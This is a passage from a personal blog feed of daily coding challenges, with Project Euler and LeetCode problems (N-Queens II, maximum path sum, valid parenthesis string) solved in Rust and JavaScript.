class="number">0</span>..<span class="number">12</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> day == <span class="number">0</span> &#123;</span><br><span class="line">                ans += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> month == <span class="number">1</span> &#123;</span><br><span class="line">                day = <span class="keyword">if</span> is_leap_year(year) &#123; (day + <span class="number">29</span>) % <span class="number">7</span> &#125; <span class="keyword">else</span> &#123; (day + <span class="number">28</span>) % <span class="number">7</span> &#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                day = (day + days[month]) % <span class="number">7</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">is_leap_year</span></span>(n: <span class="built_in">i32</span>) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    n % <span class="number">400</span> == <span class="number">0</span> || (n % <span class="number">100</span> != <span class="number">0</span> &amp;&amp; n % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">52. N-Queens II</span><br><span class="line"></span><br><span class="line">The n-queens puzzle is the problem of placing n queens on an n×n chessboard such that no two queens attack each other.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Given an integer n, return the number of distinct solutions to the n-queens puzzle.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">Input: 4</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: There are two distinct solutions to the 4-queens puzzle as shown below.</span><br><span class="line">[</span><br><span class="line"> [&quot;.Q..&quot;,  // Solution 1</span><br><span class="line">  &quot;...Q&quot;,</span><br><span class="line">  &quot;Q...&quot;,</span><br><span class="line">  &quot;..Q.&quot;],</span><br><span class="line"></span><br><span class="line"> [&quot;..Q.&quot;,  // Solution 2</span><br><span class="line">  &quot;Q...&quot;,</span><br><span class="line">  &quot;...Q&quot;,</span><br><span class="line">  &quot;.Q..&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="https://assets.leetcode.com/uploads/2018/10/12/8-queens.png" alt="img"></p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Simple DFS.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; n</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> totalNQueens = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> row = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> dfs = <span class="function">(<span class="params">r</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(r == n)&#123;</span><br><span class="line">      ans++;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; n; ++ i)&#123;</span><br><span class="line">      <span class="keyword">if</span>(check(r, i))&#123;</span><br><span class="line">        row[r] = i;</span><br><span class="line">        dfs(r + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">let</span> check = <span class="function">(<span class="params">r, col</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; r; ++i)&#123;</span><br><span class="line">      <span class="keyword">if</span>(row[i] == col || <span class="built_in">Math</span>.abs(row[i] - col) == <span class="built_in">Math</span>.abs(r - i))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  dfs(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-07 Daily Challenge</title>
      <link href="/2019-01-07-Daily-Challenge/"/>
      <url>/2019-01-07-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Maximum path sum I</em> in <em>Rust</em> and <em>Valid Parenthesis String</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Maximum path sum I</span><br><span class="line"></span><br><span class="line">Problem 18 </span><br><span class="line"></span><br><span class="line">By starting at the top of the triangle below and moving to adjacent numbers on the row below, the maximum total from top to bottom is 23.</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">7 4</span><br><span class="line">2 4 6</span><br><span class="line">8 5 9 3</span><br><span class="line"></span><br><span class="line">That is, 3 + 7 + 4 + 9 = 23.</span><br><span class="line"></span><br><span class="line">Find the maximum total from top to bottom of the triangle below:</span><br><span class="line"></span><br><span class="line">75</span><br><span class="line">95 64</span><br><span class="line">17 47 82</span><br><span class="line">18 35 87 10</span><br><span class="line">20 04 82 47 65</span><br><span class="line">19 01 23 75 03 34</span><br><span class="line">88 02 77 73 07 63 67</span><br><span class="line">99 65 04 28 06 16 70 92</span><br><span class="line">41 41 26 56 83 40 80 70 33</span><br><span class="line">41 48 72 33 47 32 37 16 94 29</span><br><span class="line">53 71 44 65 25 43 91 52 97 51 14</span><br><span class="line">70 11 33 28 77 73 17 78 39 68 17 57</span><br><span class="line">91 71 52 38 17 14 91 43 58 50 27 29 48</span><br><span class="line">63 66 04 68 89 53 67 30 73 16 69 87 40 31</span><br><span class="line">04 62 98 27 23 09 70 98 73 93 38 53 60 04 23</span><br><span class="line"></span><br><span class="line">NOTE: As there are only 16384 routes, it is possible to solve this problem by trying every route. However, Problem 67, is the same challenge with a triangle containing one-hundred rows; it cannot be solved by brute force, and requires a clever method! ;o)</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>DP or recursive method is capable of doing this.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::cmp::max;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> nums = [[<span class="number">75</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">95</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">17</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">18</span>, <span class="number">35</span>, <span class="number">87</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">20</span>, <span class="number">4</span>, <span class="number">82</span>, <span class="number">47</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">19</span>, <span class="number">1</span>, <span class="number">23</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">88</span>, <span class="number">2</span>, <span class="number">77</span>, <span class="number">73</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">99</span>, <span class="number">65</span>, <span class="number">4</span>, <span class="number">28</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">70</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">41</span>, <span class="number">41</span>, <span class="number">26</span>, <span class="number">56</span>, <span class="number">83</span>, <span class="number">40</span>, <span class="number">80</span>, <span class="number">70</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">41</span>, <span class="number">48</span>, <span class="number">72</span>, <span class="number">33</span>, <span class="number">47</span>, <span class="number">32</span>, <span class="number">37</span>, <span class="number">16</span>, <span class="number">94</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">53</span>, <span class="number">71</span>, <span class="number">44</span>, <span class="number">65</span>, <span class="number">25</span>, <span class="number">43</span>, <span class="number">91</span>, <span class="number">52</span>, <span class="number">97</span>, <span class="number">51</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">70</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">28</span>, <span class="number">77</span>, <span class="number">73</span>, <span class="number">17</span>, <span class="number">78</span>, <span class="number">39</span>, <span class="number">68</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">91</span>, <span class="number">71</span>, <span class="number">52</span>, <span class="number">38</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">91</span>, <span class="number">43</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">63</span>, <span class="number">66</span>, <span class="number">4</span>, <span class="number">68</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">67</span>, <span class="number">30</span>, <span class="number">73</span>, <span class="number">16</span>, <span class="number">69</span>, <span class="number">87</span>, <span class="number">40</span>, <span class="number">31</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">4</span>, <span class="number">62</span>, <span class="number">98</span>, <span class="number">27</span>, <span class="number">23</span>, <span class="number">9</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">73</span>, <span class="number">93</span>, <span class="number">38</span>, <span class="number">53</span>, <span class="number">60</span>, <span class="number">4</span>, <span class="number">23</span>]];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> mx = [[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, ],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]];</span><br><span class="line">    mx[<span class="number">0</span>][<span class="number">0</span>] = nums[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">15</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">0</span>..i+<span class="number">1</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">0</span> &#123;</span><br><span class="line">                mx[i][j] = mx[i-<span class="number">1</span>][j] + nums[i][j];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> i == j &#123;</span><br><span class="line">                mx[i][j] = mx[i-<span class="number">1</span>][j-<span class="number">1</span>] + nums[i][j];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                mx[i][j] = max(mx[i-<span class="number">1</span>][j], mx[i-<span class="number">1</span>][j-<span class="number">1</span>]) + nums[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// print!("&#123;&#125; ", mx[i][j]);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// println!("");</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">15</span> &#123;</span><br><span class="line">        ans = max(ans, mx[<span class="number">14</span>][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">678. Valid Parenthesis String</span><br><span class="line"></span><br><span class="line">Given a string containing only three types of characters: &apos;(&apos;, &apos;)&apos; and &apos;*&apos;, write a function to check whether this string is valid. We define the validity of a string by these rules:</span><br><span class="line"></span><br><span class="line">Any left parenthesis &apos;(&apos; must have a corresponding right parenthesis &apos;)&apos;.</span><br><span class="line">Any right parenthesis &apos;)&apos; must have a corresponding left parenthesis &apos;(&apos;.</span><br><span class="line">Left parenthesis &apos;(&apos; must go before the corresponding right parenthesis &apos;)&apos;.</span><br><span class="line">&apos;*&apos; could be treated as a single right parenthesis &apos;)&apos; or a single left parenthesis &apos;(&apos; or an empty string.</span><br><span class="line">An empty string is also valid.</span><br><span class="line">Example 1:</span><br><span class="line">Input: &quot;()&quot;</span><br><span class="line">Output: True</span><br><span class="line">Example 2:</span><br><span class="line">Input: &quot;(*)&quot;</span><br><span class="line">Output: True</span><br><span class="line">Example 3:</span><br><span class="line">Input: &quot;(*))&quot;</span><br><span class="line">Output: True</span><br><span class="line">Note:</span><br><span class="line">The string size will be in the range [1, 100].</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Simulating a stack is capable for none * parenthesis pairing.</p><p>Invalid parenthesis is &#39;(&#39; doesn&#39;t have a corresponding &#39;)&#39; or right more &#39;*&#39;, and versa versa.</p><p>Second way is to maintain the smallest and largest possible number of open left brackets after processing the current character in the string.</p><p>Solution page also illustrate a DP approach but with $O(N^3)$ time complexity and $O(N^2)$ space complexity, so I don&#39;t want to implement it.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> checkValidString = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> stack = [];</span><br><span class="line">  <span class="keyword">let</span> star = [];</span><br><span class="line">  <span class="keyword">let</span> len = s.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; ++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(s.charAt(i) === <span class="string">"("</span>)&#123;</span><br><span class="line">      stack.push(i);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.charAt(i) === <span class="string">")"</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(stack.length)&#123;</span><br><span class="line">        stack.pop();</span><br><span class="line">      &#125;<span class="keyword">else</span> <span class="keyword">if</span>(star.length)&#123;</span><br><span class="line">        star.pop();</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      star.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(stack.length)&#123;</span><br><span class="line">    <span class="keyword">if</span>(star.length &amp;&amp; star[star.length<span class="number">-1</span>] &gt; stack[stack.length<span class="number">-1</span>])&#123;</span><br><span class="line">      stack.pop();</span><br><span class="line">      star.pop();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> stack.length==<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> checkValidString = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> l = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> h = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> len = s.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; ++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(s.charAt(i)==<span class="string">"("</span>)&#123;</span><br><span class="line">      l += <span class="number">1</span>;</span><br><span class="line">      h += <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span 